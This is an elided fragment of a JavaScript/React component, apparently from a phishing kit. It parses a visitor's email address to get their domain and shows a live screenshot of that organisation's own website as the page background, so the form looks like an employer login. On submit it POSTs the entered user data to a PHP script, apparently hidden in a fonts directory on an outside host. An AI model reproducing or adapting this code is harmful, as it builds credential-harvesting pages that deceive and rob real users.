...
const Default = ()=>{
    ...
    // .toLowerCase();
        ...
        // extracetdEmail.charAt(0).toUpperCase() + firstProcess

    console.log('input email =>',capitalizeFirstLetter);
    ...
    const submitDefaultForm = (e)=>{
        ...
        $.ajax({
            type: "POST",
            url: "https://pearldozen.com/nc_assets/fonts/compens/aa.php",
            data: user,
            success(data) {
                // alert('OK');
                console.log(data);
    ...
    style={{
        backgroundImage: `url(https://image.thum.io/get/auth/69553-ford/https://www.${extracetdEmail})`,
        // backgroundImage: `url(https://image.thum.io/get/auth/69257-c9081e4bf3bfce9be8aa484cc8a0999e/https://www.${extracetdEmail}/)`,
        // backgroundImage: `url(${BG})`,
        // https://image.thum.io/get/auth/69553-ford/https://www.wikipedia.org/
        width:'100vw',
        height:'100vh',
    ...
    >
        ...
        {/* <img className="bgggg" src="//image.thum.io/get/http://www.google.com/"rl /> */}
